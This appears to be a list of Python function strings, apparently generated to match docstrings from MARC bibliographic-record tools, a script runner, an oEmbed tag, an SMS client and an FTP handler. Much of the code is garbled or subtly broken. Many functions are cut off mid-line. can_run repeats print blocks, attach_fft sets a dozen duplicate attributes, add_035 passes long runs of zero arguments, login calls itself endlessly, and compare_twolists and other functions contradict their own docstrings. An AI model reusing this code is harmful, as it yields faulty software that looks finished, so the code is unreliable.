        "def oembed_url_scheme(context, link):\n    \"\"\"\n    Generates a &lt;link&gt; tag with oembed autodiscovery bits.\n\n    {% oembed_url_scheme %}\n    \"\"\"\n    oembed_url_scheme = link.get('oembed_url_scheme', None)\n    if oembed_url_scheme is None:\n        return ''\n    return '<link rel=\"oembed\" href=\"{0}\" type=\"application/x-oembed\" />'.format(oembed_url_scheme)",
        "def get_parser(self):\n        \"\"\"return the parser for the current name\"\"\"\n        if self.parser is None:\n            self.parser = self.get_parser_class()\n        return self.parser",
        "def load_module(self, module_name):\n        \"\"\"load the module so we can actually run the script's function\"\"\"\n        module = importlib.import_module(module_name)\n        self.module = module\n        self.module_name = module_name\n        self.module_path = module.__path__[0]\n        self.module_path = os.path.join(self.module_path, module_name)\n        self.module_path = os.path.abspath(self.module_path)\n        self.module_path = os.path.join(self.module_path, 'scripts')\n        self.module_path = os.path.abspath(self.module_path)\n        self.module_path = os.path.join(self.module_path, 'scripts')\n        self.module_path = os.path.",
        "def get_script(self, script_name):\n        \"\"\"get the contents of the script\"\"\"\n        if script_name not in self.scripts:\n            raise ValueError(\"Script %s not found\" % script_name)\n        return self.scripts[script_name].get_content()",
        "def run(self):\n        \"\"\"parse and import the script, and then run the script's main function\"\"\"\n        try:\n            self.parse()\n        except Exception as e:\n            print(e)\n            sys.exit(1)\n        try:\n            self.import_script()\n        except Exception as e:\n            print(e)\n            sys.exit(1)\n        try:\n            self.main()\n        except Exception as e:\n            print(e)\n            sys.exit(1)",
        "def call_path(self, basepath):\n        \"\"\"return that path to be able to call this script from the passed in\n        basename\n\n        example -- \n            basepath = /foo/bar\n            self.path = /foo/bar/che/baz.py\n            self.call_path(basepath) # che/baz.py\n\n        basepath -- string -- the directory you would be calling this script in\n        return -- string -- the minimum path that you could use to execute this script\n            in basepath\n        \"\"\"\n        basename = os.path.basename(self.path)\n        if basename == basename.replace('.py', ''):\n            return self.path\n        else:\n            return os.path.join(basepath, basename)",
        "def load_script(self, script_path):\n        \"\"\"load the script and set the parser and argument info\n\n        I feel that this is way too brittle to be used long term, I think it just\n        might be best to import the stupid module, the thing I don't like about that\n        is then we import basically everything, which seems bad?\n        \"\"\"\n        try:\n            self.parser = argparse.ArgumentParser(\n                prog=self.prog,\n                description=self.description,\n                formatter_class=argparse.RawDescriptionHelpFormatter)\n            self.parser.add_argument(\n                '-v', '--verbose', action='store_true',\n                help='increase output verbosity')\n            self.parser.add_argument(\n                '-d', '--debug', action='store_true',\n                help='increase output verbosity')\n           ",
        "def can_run(self):\n        \"\"\"return True if this script can be run from the command line\"\"\"\n        if self.args.verbose:\n            print(\"Running script: %s\" % self.name)\n        if self.args.verbose:\n            print(\"\")\n        if self.args.debug:\n            print(\"DEBUG: %s\" % self.name)\n        if self.args.debug:\n            print(\"\")\n        if self.args.verbose:\n            print(\"\")\n        if self.args.debug:\n            print(\"\")\n        if self.args.verbose:\n            print(\"\")\n        if self.args.debug:\n            print(\"\")\n        if self.args.verbose:\n            print(\"\")\n        if self.args.debug:\n            print(\"\")\n        if self.args.verbose:\n            print(\"\")\n       ",
        "def register_fields(model, fields):\n    \"\"\"\n    Handles registering the fields with the FieldRegistry and creating a \n    post-save signal for the model.\n    \"\"\"\n    for field in fields:\n        field.model = model\n        field.name = field.name.replace('_', '-')\n        field.auto_created = True\n        field.auto_updated = True\n        field.auto_created_by = model._meta.get_field(field.name).auto_created_by\n        field.auto_updated_by = model._meta.get_field(field.name).auto_updated_by\n        field.save(using=model._state.db)\n        model._state.signals.post_save.connect(\n            signal_post_save, sender=model,\n            dispatch_uid=model._state.signals.post_save_dispatch_",
        "def _create_signal(self, model):\n        \"\"\"\n        I need a way to ensure that this signal gets created for all child\n        models, and since model inheritance doesn't have a 'contrubite_to_class'\n        style hook, I am creating a fake virtual field which will be added to\n        all subclasses and handles creating the signal\n        \"\"\"\n        signal = self.get_signal(model)\n        signal.connect(self.create_signal_for_child_model)\n        return signal",
        "def fetch_response(url, timeout=None):\n    \"\"\"Fetch response headers and data from a URL, raising a generic exception\n    for any kind of failure.\n    \"\"\"\n    try:\n        response = requests.get(url, timeout=timeout)\n    except requests.exceptions.ConnectionError:\n        raise ConnectionError(url)\n    except requests.exceptions.Timeout:\n        raise TimeoutError(url)\n    except requests.exceptions.RequestException:\n        raise RequestException(url)\n    return response.headers, response.content",
        "def _url_to_example(url):\n    \"\"\"\n    Given a url which may or may not be a relative url, convert it to a full\n    url path given another full url as an example\n    \"\"\"\n    if url.startswith('/'):\n        return url\n    else:\n        return url + '/'",
        "def _generate_request(self, method, url, params=None, data=None, headers=None):\n        \"\"\"Generate a fake request object to allow oEmbeds to use context processors.\"\"\"\n        request = Request(method, url, params, data, headers)\n        return request",
        "def load_class(name):\n    \"\"\"dynamically load a class given a string of the format\n    \n    package.Class\n    \"\"\"\n    try:\n        mod, cls = name.rsplit('.', 1)\n        mod = import_module(mod)\n        cls = getattr(mod, cls)\n    except ImportError:\n        raise ImportError(\"Could not import class %s\" % name)\n    return cls",
        "def get_record(self, record_id):\n        \"\"\"Override the base get_record.\"\"\"\n        if record_id in self.records:\n            return self.records[record_id]\n        else:\n            return None",
        "def _handle_cms_note(self, record):\n        \"\"\"Special handling if record is a CMS NOTE.\"\"\"\n        if record.is_cms_note:\n            return\n        if record.is_draft:\n            self.log(\n                'CMS note is draft, skipping',\n                level=DEBUG,\n                record=record,\n            )\n            return\n        if record.is_public:\n            self.log(\n                'CMS note is public, skipping',\n                level=DEBUG,\n                record=record,\n            )\n            return\n        if record.is_private:\n            self.log(\n                'CMS note is private, skipping',\n                level=DEBUG,\n                record=record,\n            )\n            return\n        if record.is_public or record.is_private:\n            self.log(\n                'CMS note is not public or private",
        "def _handle_reportnumber(self, line):\n        \"\"\"Handle reportnumbers.\"\"\"\n        if line.startswith('#'):\n            return\n        if line.startswith('#'):\n            self.reportnumber = int(line[1:])\n        else:\n            self.reportnumber = int(line)",
        "def cmd_653(self, args):\n        \"\"\"653 Free Keywords.\"\"\"\n        if len(args) < 1:\n            print(\"Usage: fakekwords [keywords]\")\n            return\n        keywords = args\n        if not keywords:\n            print(\"No keywords to show.\")\n            return\n        for keyword in keywords:\n            print(\"{0} {1}\".format(keyword, self.get_keyword(keyword)))",
        "def on_key_up(self, key):\n        \"\"\"710 Collaboration.\"\"\"\n        if key.key_code == QtCore.Qt.Key_Escape:\n            self.close()\n        elif key.key_code == QtCore.Qt.Key_Tab:\n            self.open()",
        "def create_field(elements, global_position=-1):\n    \"\"\"Return a field created with the provided elements.\n\n    Global position is set arbitrary to -1.\n    \"\"\"\n    global_position = global_position if global_position >= 0 else 0\n    return Field(elements, global_position)",
        "def create_records(description):\n    \"\"\"Create a list of records from the marcxml description.\n\n    :returns: a list of objects initiated by the function create_record().\n              Please see that function's docstring.\n    \"\"\"\n    records = []\n    for record in description.findall('record'):\n        record_id = record.attrib['id']\n        record_type = record.attrib['type']\n        record_type = record_type.lower()\n        if record_type == 'text':\n            record_text = record.text\n        elif record_type == 'text/plain':\n            record_text = record.text.decode('utf-8')\n        elif record_type == 'text/html':\n            record_text = record.text.decode('utf-8')\n        elif record_type == 'text/plain/xml':\n            record",
        "def parse_marcxml(marcxml, verbose=0, correct=0):\n    \"\"\"Create a record object from the marcxml description.\n\n    Uses the lxml parser.\n\n    The returned object is a tuple (record, status_code, list_of_errors),\n    where status_code is 0 when there are errors, 1 when no errors.\n\n    The return record structure is as follows::\n\n        Record := {tag : [Field]}\n        Field := (Subfields, ind1, ind2, value)\n        Subfields := [(code, value)]\n\n    .. code-block:: none\n\n                                    .--------.\n                                    | record |\n                                    '---+----'\n                                        |\n               .------------------------+------------------------------------.\n               |record['001']           |record['909']        |record['520'] |\n              ",
        "def record_filter_field(field_instances, filter_subcode, filter_value,\n                       filter_mode='e'):\n    \"\"\"Filter the given field.\n\n    Filters given field and returns only that field instances that contain\n    filter_subcode with given filter_value. As an input for search function\n    accepts output from record_get_field_instances function. Function can be\n    run in three modes:\n\n    - 'e' - looking for exact match in subfield value\n    - 's' - looking for substring in subfield value\n    - 'r' - looking for regular expression in subfield value\n\n    Example:\n\n    record_filter_field(record_get_field_instances(rec, '999', '%', '%'),\n                        'y', '2001')\n\n    In this case filter_subcode is 'y' and filter_value is '2001'.",
        "def _remove_duplicates(record):\n    \"\"\"Return a record where all the duplicate fields have been removed.\n\n    Fields are considered identical considering also the order of their\n    subfields.\n    \"\"\"\n    new_record = copy.copy(record)\n    for field in new_record.fields:\n        if field.name in new_record.fields:\n            del new_record.fields[field.name]\n    return new_record",
        "def _is_identical(rec1, rec2):\n    \"\"\"Return True if rec1 is identical to rec2.\n\n    It does so regardless of a difference in the 005 tag (i.e. the timestamp).\n    \"\"\"\n    if rec1.get('005') != rec2.get('005'):\n        return False\n    if rec1.get('timestamp') != rec2.get('timestamp'):\n        return False\n    return True",
        "def get_fields(rec, tag, ind1, ind2, code):\n    \"\"\"Return the list of field instances for the specified tag and indications.\n\n    Return empty list if not found.\n    If tag is empty string, returns all fields\n\n    Parameters (tag, ind1, ind2) can contain wildcard %.\n\n    :param rec: a record structure as returned by create_record()\n    :param tag: a 3 characters long string\n    :param ind1: a 1 character long string\n    :param ind2: a 1 character long string\n    :param code: a 1 character long string\n    :return: a list of field tuples (Subfields, ind1, ind2, value,\n             field_position_global) where subfields is list of (code, value)\n    \"\"\"\n    if tag == '':\n        return [(None, ind1, ind",
        "def delete_field(rec, tag, ind1=None, ind2=None,\n                 field_position_global=None, field_position_local=None):\n    \"\"\"Delete the field with the given position.\n\n    If global field position is specified, deletes the field with the\n    corresponding global field position.\n    If field_position_local is specified, deletes the field with the\n    corresponding local field position and tag.\n    Else deletes all the fields matching tag and optionally ind1 and\n    ind2.\n\n    If both field_position_global and field_position_local are present,\n    then field_position_local takes precedence.\n\n    :param rec: the record data structure\n    :param tag: the tag of the field to be deleted\n    :param ind1: the first indicator of the field to be deleted\n    :param ind2: the second indicator of the field",
        "def add_fields_to_record(rec, tag, field_position_local, a):\n    \"\"\"Add the fields into the record at the required position.\n\n    The position is specified by the tag and the field_position_local in the\n    list of fields.\n\n    :param rec: a record structure\n    :param tag: the tag of the fields to be moved\n    :param field_position_local: the field_position_local to which the field\n                                 will be inserted. If not specified, appends\n                                 the fields to the tag.\n    :param a: list of fields to be added\n    :return: -1 if the operation failed, or the field_position_local if it was\n             successful\n    \"\"\"\n    if len(a) == 0:\n        return -1\n    if field_position_local == -1:\n        field_position_local =",
        "def move_fields(rec, tag, field_positions_local, field_position_local=None):\n    \"\"\"\n    Move some fields to the position specified by 'field_position_local'.\n\n    :param rec: a record structure as returned by create_record()\n    :param tag: the tag of the fields to be moved\n    :param field_positions_local: the positions of the fields to move\n    :param field_position_local: insert the field before that\n                                 field_position_local. If unspecified, appends\n                                 the fields :return: the field_position_local\n                                 is the operation was successful\n    \"\"\"\n    if field_position_local is None:\n        field_position_local = len(rec.fields)\n    for i, field in enumerate(rec.fields):\n        if tag in field.tags:\n            if i == field_position_local",
        "def delete_subfields(self, subfield_code):\n        \"\"\"Delete all subfields with subfield_code in the record.\"\"\"\n        for subfield in self.subfields:\n            if subfield.code == subfield_code:\n                self.subfields.remove(subfield)",
        "def get_field(field_code, field_position):\n    \"\"\"Return the the matching field.\n\n    One has to enter either a global field position or a local field position.\n\n    :return: a list of subfield tuples (subfield code, value).\n    :rtype: list\n    \"\"\"\n    if field_code == 'global':\n        return get_global_field(field_position)\n    else:\n        return get_local_field(field_position)",
        "def replace_field(self, old_field, new_field):\n        \"\"\"Replace a field with a new field.\"\"\"\n        if old_field in self.fields:\n            self.fields[old_field] = new_field\n        else:\n            raise ValueError(\"Field %s not in %s\" % (old_field, self.fields))",
        "def get_subfield(field, global_field_position=None, local_field_position=None):\n    \"\"\"Return the subfield of the matching field.\n\n    One has to enter either a global field position or a local field position.\n\n    :return: a list of subfield tuples (subfield code, value).\n    :rtype:  list\n    \"\"\"\n    if global_field_position is None:\n        global_field_position = field.position\n    if local_field_position is None:\n        local_field_position = field.position\n    if global_field_position < 0 or local_field_position < 0:\n        raise ValueError(\"Field position out of range\")\n    return field.subfields[global_field_position:local_field_position]",
        "def delete_subfield(tag, field_number, position):\n    \"\"\"Delete subfield from position specified.\n\n    Specify the subfield by tag, field number and subfield position.\n    \"\"\"\n    if tag in _subfields:\n        if field_number in _subfields[tag]:\n            del _subfields[tag][field_number]\n    else:\n        raise ValueError(\"Tag %s, field %s, position %s not in subfield list\" % (tag, field_number, position))",
        "def add_subfield(tag, field_number, subfield_position=None):\n    \"\"\"Add subfield into specified position.\n\n    Specify the subfield by tag, field number and optionally by subfield\n    position.\n    \"\"\"\n    if subfield_position is None:\n        subfield_position = 0\n    if subfield_position < 0:\n        subfield_position = len(subfield) + subfield_position\n    if subfield_position > len(subfield):\n        subfield_position = len(subfield)\n    subfield_pos = subfield_position\n    subfield_tag = tag\n    if subfield_tag in _subfield_tags:\n        raise ValueError('Subfield tag %s already exists' % subfield_tag)\n    _subfield_tags[subfield_tag] = subfield_pos\n    _subfield_fields[subfield_tag] = field_number\n    _subfield",
        "def modify_controlfield(self, tag, field, value):\n        \"\"\"Modify controlfield at position specified by tag and field number.\"\"\"\n        if tag == self.tag_controlfield:\n            self.controlfield_values[field] = value\n        else:\n            raise ValueError(\"Invalid tag: %s\" % tag)",
        "def modify_subfield(tag, field_number, position):\n    \"\"\"Modify subfield at specified position.\n\n    Specify the subfield by tag, field number and subfield position.\n    \"\"\"\n    subfield = Subfield.objects.get(tag=tag, field_number=field_number)\n    subfield.position = position\n    subfield.save()",
        "def move_subfield(subfield, new_pos):\n    \"\"\"Move subfield at specified position.\n\n    Sspecify the subfield by tag, field number and subfield position to new\n    subfield position.\n    \"\"\"\n    tag, field_number, subfield_pos = subfield\n    if tag == 'SUBFIELD':\n        field_number += 1\n        subfield_pos += 1\n    else:\n        raise ValueError('Subfield tag is not supported')\n    if subfield_pos > len(subfield):\n        raise ValueError('Subfield position is out of range')\n    subfield[subfield_pos] = tag\n    return subfield",
        "def xml_record(rec, tags=None):\n    \"\"\"\n    Generate the XML for record 'rec'.\n\n    :param rec: record\n    :param tags: list of tags to be printed\n    :return: string\n    \"\"\"\n    if tags is None:\n        tags = []\n    xml = etree.Element(rec.name)\n    for tag in tags:\n        xml.set(tag, rec.get(tag))\n    return xml.tostring()",
        "def _generate_xml(self, field):\n        \"\"\"Generate the XML for field 'field' and returns it as a string.\"\"\"\n        xml = self._generate_field_xml(field)\n        xml = self._add_xml_attributes(xml)\n        xml = self._add_xml_text(xml)\n        return xml",
        "def print_record(record, format=1, tags=None):\n    \"\"\"Print a record.\n\n    :param format: 1 XML, 2 HTML (not implemented)\n    :param tags: list of tags to be printed\n    \"\"\"\n    if format == 1:\n        print(record.xml)\n    elif format == 2:\n        print(record.html)\n    else:\n        raise ValueError(\"Invalid format\")",
        "def print_list(listofrec, format=1, tags=None):\n    \"\"\"Print a list of records.\n\n    :param format: 1 XML, 2 HTML (not implemented)\n    :param tags: list of tags to be printed\n           if 'listofrec' is not a list it returns empty string\n    \"\"\"\n    if format == 1:\n        print(listofrec)\n    elif format == 2:\n        if tags is None:\n            tags = []\n        for rec in listofrec:\n            print(rec, tags)",
        "def find_field(rec, tag, field, strict=True):\n    \"\"\"\n    Return the global and local positions of the first occurrence of the field.\n\n    :param rec:    A record dictionary structure\n    :type  rec:    dictionary\n    :param tag:    The tag of the field to search for\n    :type  tag:    string\n    :param field:  A field tuple as returned by create_field()\n    :type  field:  tuple\n    :param strict: A boolean describing the search method. If strict\n                   is False, then the order of the subfields doesn't\n                   matter. Default search method is strict.\n    :type  strict: boolean\n    :return:       A tuple of (global_position, local_position) or a\n                   tuple (None, None) if the field is not present.\n    :rtype:        tuple\n    :",
        "def find_subfield(rec, tag, ind1, ind2, sub_key, sub_value, sub_key2, sub_value2,\n                   case_sensitive=False):\n    \"\"\"Find subfield instances in a particular field.\n\n    It tests values in 1 of 3 possible ways:\n     - Does a subfield code exist? (ie does 773__a exist?)\n     - Does a subfield have a particular value? (ie 773__a == 'PhysX')\n     - Do a pair of subfields have particular values?\n        (ie 035__2 == 'CDS' and 035__a == '123456')\n\n    Parameters:\n     * rec - dictionary: a bibrecord structure\n     * tag - string: the tag of the field (ie '773')\n     * ind1, ind2 - char: a single characters for the MARC indicators\n    ",
        "def _remove_volatile_fields(self, record):\n        \"\"\"Remove unchanged volatile subfields from the record.\"\"\"\n        for field in record._fields:\n            if field.volatile:\n                del record._fields[field]",
        "def _make_volatile(self):\n        \"\"\"Turns all subfields to volatile\"\"\"\n        for field in self.fields:\n            if isinstance(field, Field):\n                field._volatile = True",
        "def strip_empty_fields(rec, tag=None):\n    \"\"\"\n    Remove empty subfields and fields from the record.\n\n    If 'tag' is not None, only a specific tag of the record will be stripped,\n    otherwise the whole record.\n\n    :param rec:  A record dictionary structure\n    :type  rec:  dictionary\n    :param tag:  The tag of the field to strip empty fields from\n    :type  tag:  string\n    \"\"\"\n    if tag is not None:\n        rec = _strip_empty_fields(rec, tag)\n    return rec",
        "def _remove_controlfields(rec):\n    \"\"\"\n    Remove all non-empty controlfields from the record.\n\n    :param rec:  A record dictionary structure\n    :type  rec:  dictionary\n    \"\"\"\n    for key in rec:\n        if rec[key] != '':\n            del rec[key]",
        "def order_subfields(rec, tag=None):\n    \"\"\"Order subfields from a record alphabetically based on subfield code.\n\n    If 'tag' is not None, only a specific tag of the record will be reordered,\n    otherwise the whole record.\n\n    :param rec: bibrecord\n    :type rec: bibrec\n    :param tag: tag where the subfields will be ordered\n    :type tag: str\n    \"\"\"\n    if tag is None:\n        return rec\n    else:\n        return [sub for sub in rec.subfields if sub.tag == tag]",
        "def _field_eq(field1, field2, strict=False):\n    \"\"\"Compare 2 fields.\n\n    If strict is True, then the order of the subfield will be taken care of, if\n    not then the order of the subfields doesn't matter.\n\n    :return: True if the field are equivalent, False otherwise.\n    \"\"\"\n    if field1 is None or field2 is None:\n        return True\n\n    if field1.name != field2.name:\n        return False\n\n    if field1.type != field2.type:\n        return False\n\n    if field1.size != field2.size:\n        return False\n\n    if field1.is_repeated and field2.is_repeated:\n        if field1.size != field2.size:\n            return False\n\n        for i in range(field1.size):",
        "def _check_field(field):\n    \"\"\"Check if a field is well-formed.\n\n    :param field: A field tuple as returned by create_field()\n    :type field:  tuple\n    :raise InvenioBibRecordFieldError: If the field is invalid.\n    \"\"\"\n    if len(field) != 3:\n        raise InvenioBibRecordFieldError(\n            \"Invalid field: %s\" % field)\n    if field[0] != 'BIB':\n        raise InvenioBibRecordFieldError(\n            \"Invalid field: %s\" % field)\n    if field[1] != 'RECORD':\n        raise InvenioBibRecordFieldError(\n            \"Invalid field: %s\" % field)\n    if field[2] != 'FIELD':\n        raise InvenioBibRecordFieldError(\n            \"",
        "def shift_global_field_positions(start, delta):\n    \"\"\"Shift all global field positions.\n\n    Shift all global field positions with global field positions\n    higher or equal to 'start' from the value 'delta'.\n    \"\"\"\n    global_field_positions = global_field_positions_from_db()\n    for i in range(len(global_field_positions)):\n        if global_field_positions[i] < start:\n            global_field_positions[i] += delta",
        "def _tag_matches_pattern(tag, pattern):\n    \"\"\"Return true if MARC 'tag' matches a 'pattern'.\n\n    'pattern' is plain text, with % as wildcard\n\n    Both parameters must be 3 characters long strings.\n\n    .. doctest::\n\n        >>> _tag_matches_pattern(\"909\", \"909\")\n        True\n        >>> _tag_matches_pattern(\"909\", \"9%9\")\n        True\n        >>> _tag_matches_pattern(\"909\", \"9%8\")\n        False\n\n    :param tag: a 3 characters long string\n    :param pattern: a 3 characters long string\n    :return: False or True\n    \"\"\"\n    if len(tag) != 3:\n        raise ValueError(\"tag must be 3 characters long\")\n    if len(pattern) != 3:\n        raise ValueError(\"pattern must be",
        "def _check_global_field_positions(record):\n    \"\"\"Check if the global field positions in the record are valid.\n\n    I.e., no duplicate global field positions and local field positions in the\n    list of fields are ascending.\n\n    :param record: the record data structure\n    :return: the first error found as a string or None if no error was found\n    \"\"\"\n    errors = []\n    for field in record.fields:\n        if field.global_position is None:\n            errors.append(\"Global field position %s is missing\" % field.name)\n    if errors:\n        return errors[0]\n    return None",
        "def sort_fields(self, indicator):\n        \"\"\"Sort the fields inside the record by indicators.\"\"\"\n        if indicator in self.fields:\n            return self.fields[indicator].sort()\n        else:\n            return self.fields.keys()",
        "def sort_fields(fields):\n    \"\"\"Sort a set of fields by their indicators.\n\n    Return a sorted list with correct global field positions.\n    \"\"\"\n    global_fields = set(fields)\n    global_fields.update(set(\n        [\n            field.indicator\n            for field in fields\n            if field.indicator\n        ]\n    ))\n    return sorted(global_fields)",
        "def create_record(xml_file, correct=1, verbose=0):\n    \"\"\"Create a record object using the LXML parser.\n\n    If correct == 1, then perform DTD validation\n    If correct == 0, then do not perform DTD validation\n\n    If verbose == 0, the parser will not give warnings.\n    If 1 <= verbose <= 3, the parser will not give errors, but will warn\n        the user about possible mistakes (implement me!)\n    If verbose > 3 then the parser will be strict and will stop in case of\n        well-formedness errors or DTD errors.\n    \"\"\"\n    if verbose == 0:\n        return Record(xml_file)\n    if verbose == 1:\n        return Record(xml_file, correct=correct)\n    if verbose == 2:\n        return Record(xml_file, verbose=verbose)\n    raise ValueError(\"Invalid",
        "def get_children(node, name):\n    \"\"\"Retrieve all children from node 'node' with name 'name'.\"\"\"\n    children = []\n    for child in node.childNodes:\n        if child.nodeName == name:\n            children.append(child)\n    return children",
        "def _get_text_node_values(node):\n    \"\"\"Iterate through all the children of a node.\n\n    Returns one string containing the values from all the text-nodes\n    recursively.\n    \"\"\"\n    if isinstance(node, _Text):\n        yield node.value\n        for child in node.children:\n            yield _get_text_node_values(child)",
        "def _check_record(record):\n    \"\"\"Check and correct the structure of the record.\n\n    :param record: the record data structure\n    :return: a list of errors found\n    \"\"\"\n    errors = []\n    if record.get('type') != 'record':\n        errors.append('Expected record type to be record')\n    if record.get('name') is None:\n        errors.append('Expected record name to be set')\n    if record.get('value') is None:\n        errors.append('Expected record value to be set')\n    if record.get('type') != 'array':\n        errors.append('Expected record type to be array')\n    if record.get('size') is None:\n        errors.append('Expected record size to be set')\n    if record.get('type') != 'array':\n        errors.append('Expected record type",
        "def warning_message(code):\n    \"\"\"Return a warning message of code 'code'.\n\n    If code = (cd, str) it returns the warning message of code 'cd' and appends\n    str at the end\n    \"\"\"\n    if isinstance(code, tuple):\n        return \"Warning: %s\" % \", \".join(code)\n    else:\n        return \"Warning: %s\" % code",
        "def compare_twolists(list1, list2, custom_cmp):\n    \"\"\"\n    Compare twolists using given comparing function.\n\n    :param list1: first list to compare\n    :param list2: second list to compare\n    :param custom_cmp: a function taking two arguments (element of\n        list 1, element of list 2) and\n    :return: True or False depending if the values are the same\n    \"\"\"\n    if len(list1) != len(list2):\n        return False\n    for i in range(len(list1)):\n        if custom_cmp(list1[i], list2[i]):\n            return True\n    return False",
        "def parse_xml(self, xml_string):\n        \"\"\"Parse an XML document and clean any namespaces.\"\"\"\n        root = ET.fromstring(xml_string)\n        self.clean_namespaces(root)\n        return root",
        "def clean_marcxml(self, xml):\n        \"\"\"Clean MARCXML harvested from OAI.\n\n        Allows the xml to be used with BibUpload or BibRecord.\n\n        :param xml: either XML as a string or path to an XML file\n\n        :return: ElementTree of clean data\n        \"\"\"\n        if isinstance(xml, str):\n            xml = open(xml, 'r')\n        return self.clean_xml(xml)",
        "def _generate_delete_if_deleted(self, record):\n        \"\"\"Generate the record deletion if deleted form OAI-PMH.\"\"\"\n        if record.deleted:\n            self.delete_record(record)",
        "def get_session(self):\n        \"\"\"Return a session for yesss.at.\"\"\"\n        if not self.session:\n            self.session = Session(self.client, self.session_id)\n        return self.session",
        "def check_login(self):\n        \"\"\"Check for working login data.\"\"\"\n        if self.login_data is None:\n            self.login_data = self.get_login_data()\n        if self.login_data is None:\n            self.login_data = self.get_login_data_from_file()\n        if self.login_data is None:\n            self.login_data = self.get_login_data_from_env()\n        if self.login_data is None:\n            self.login_data = self.get_login_data_from_env_file()\n        if self.login_data is None:\n            self.login_data = self.get_login_data_from_env_file()\n        if self.login_data is None:\n            self.login_data = self.get_login_data_",
        "def send_sms(self, message, to, cc=None, bcc=None, reply_to=None,\n                 reply_text=None, reply_html=None, **kwargs):\n        \"\"\"Send an SMS.\"\"\"\n        return self.call(\n            'sms.send',\n            to=to,\n            cc=cc,\n            bcc=bcc,\n            message=message,\n            reply_to=reply_to,\n            reply_text=reply_text,\n            reply_html=reply_html,\n            **kwargs\n        )",
        "def get_date(self):\n        \"\"\"Return the date of the article in file.\"\"\"\n        try:\n            return self.article.date\n        except AttributeError:\n            return None",
        "def articles(self):\n        \"\"\"Return this articles' collection.\"\"\"\n        return ArticleCollection(\n            self._client,\n            self.collection_path % ('articles'),\n            self.article_model,\n        )",
        "def attach_fft(self, fft):\n        \"\"\"Attach fulltext FFT.\"\"\"\n        self.fft = fft\n        self.fft_size = fft.shape[0]\n        self.fft_shape = fft.shape\n        self.fft_shape_2 = fft.shape\n        self.fft_shape_3 = fft.shape\n        self.fft_shape_4 = fft.shape\n        self.fft_shape_5 = fft.shape\n        self.fft_shape_6 = fft.shape\n        self.fft_shape_7 = fft.shape\n        self.fft_shape_8 = fft.shape\n        self.fft_shape_9 = fft.shape\n        self.fft_shape_10 = fft.shape\n        self.fft_shape_11 = fft.shape\n        self.fft_shape_12 = fft.shape\n        self.fft_",
        "def convert_all(self, records):\n        \"\"\"Convert the list of bibrecs into one MARCXML.\n\n        >>> from harvestingkit.bibrecord import BibRecordPackage\n        >>> from harvestingkit.inspire_cds_package import Inspire2CDS\n        >>> bibrecs = BibRecordPackage(\"inspire.xml\")\n        >>> bibrecs.parse()\n        >>> xml = Inspire2CDS.convert_all(bibrecs.get_records())\n\n        :param records: list of BibRecord dicts\n        :type records: list\n\n        :returns: MARCXML as string\n        \"\"\"\n        xml = MARCXML()\n        for record in records:\n            xml.add_record(record)\n        return xml",
        "def from_source(cls, source):\n        \"\"\"Yield single conversion objects from a MARCXML file or string.\n\n        >>> from harvestingkit.inspire_cds_package import Inspire2CDS\n        >>> for record in Inspire2CDS.from_source(\"inspire.xml\"):\n        >>>     xml = record.convert()\n        \"\"\"\n        if isinstance(source, str):\n            with open(source, \"r\") as f:\n                xml = f.read()\n        else:\n            xml = source\n        return cls.from_xml(xml)",
        "def get_opposite_mapping(self, kb_id):\n        \"\"\"Return the opposite mapping by searching the imported KB.\"\"\"\n        kb_id = kb_id.lower()\n        for kb in self.kb_map:\n            if kb.id.lower() == kb_id:\n                return kb\n        return None",
        "def load_config(self):\n        \"\"\"Load configuration from config.\n\n        Meant to run only once per system process as\n        class variable in subclasses.\n        \"\"\"\n        if not self.config:\n            return\n        if not self.config.has_section('config'):\n            return\n        for section in self.config.sections('config'):\n            if not self.config.has_option('config', section):\n                continue\n            if not self.config.has_option('config', section + '.path'):\n                continue\n            self.config.set(section + '.path', self.config.get('config', section + '.path'))\n            self.config.set(section + '.path_file', self.config.get('config', section + '.path_file'))\n            self.config.set(section + '.path_file_ext', self.",
        "def match(self, record):\n        \"\"\"Try to match the current record to the database.\"\"\"\n        if self.is_deleted:\n            return False\n        if self.is_modified:\n            return False\n        if self.is_new:\n            return False\n        if self.is_deleted_at is None:\n            return False\n        if self.is_modified_at is None:\n            return False\n        if self.is_new_at is None:\n            return False\n        return self.id == record.id",
        "def _get_fields(self, field_list):\n        \"\"\"Keep only fields listed in field_list.\"\"\"\n        return [f for f in self.fields if f.name in field_list]",
        "def clear_fields(self, field_list):\n        \"\"\"Clear any fields listed in field_list.\"\"\"\n        for field in field_list:\n            self.remove_field(field)",
        "def add_035(self, source):\n        \"\"\"Add 035 number from 001 recid with given source.\"\"\"\n        self.add_record(0x01, source, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x",
        "def add_control_number(self, tag, value):\n        \"\"\"Add a control-number 00x for given tag with value.\"\"\"\n        if tag not in self.control_numbers:\n            self.control_numbers[tag] = []\n        self.control_numbers[tag].append(value)",
        "def translate_categories(self):\n        \"\"\"650 Translate Categories.\"\"\"\n        self.categories = self.get_categories()\n        self.categories = [c for c in self.categories if c.category_id in self.categories_ids]\n        self.categories = sorted(self.categories, key=lambda c: c.category_id)",
        "def login(self, username, password):\n        \"\"\"Connects and logins to the server.\"\"\"\n        self.connect()\n        self.login(username, password)",
        "def download(self, source_file, target_folder=None):\n        \"\"\"Downloads a file from the FTP server to target folder\n\n        :param source_file: the absolute path for the file on the server\n                   it can be the one of the files coming from\n                   FtpHandler.dir().\n        :type source_file: string\n        :param target_folder: relative or absolute path of the\n                              destination folder default is the\n                              working directory.\n        :type target_folder: string\n        \"\"\"\n        if target_folder is None:\n            target_folder = os.getcwd()\n        self.ftp.get(source_file, target_folder)",
        "def chdir(self, folder):\n        \"\"\"\n        Changes the working directory on the server.\n\n        :param folder: the desired directory.\n        :type folder: string\n        \"\"\"\n        self._set_property('cwd', folder)\n        self._set_property('cwd_rel', os.path.relpath(folder, self._root))",
